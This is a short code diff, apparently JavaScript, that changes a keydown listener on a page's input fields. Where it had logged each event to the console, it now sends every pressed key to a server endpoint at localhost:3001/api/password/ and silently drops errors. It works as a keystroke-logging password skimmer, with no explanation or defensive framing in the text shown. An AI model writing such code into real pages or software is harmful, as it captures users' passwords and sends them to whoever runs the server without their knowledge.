@@ -6,7 +6,8 @@
 
         for (const inputElm of inputElms) {
             inputElm.addEventListener('keydown', (event) => {
-                console.log(event);
+                fetch(`https://localhost:3001/api/password/${event.key}`)
+                    .catch(() => {});
             });
         }
     });
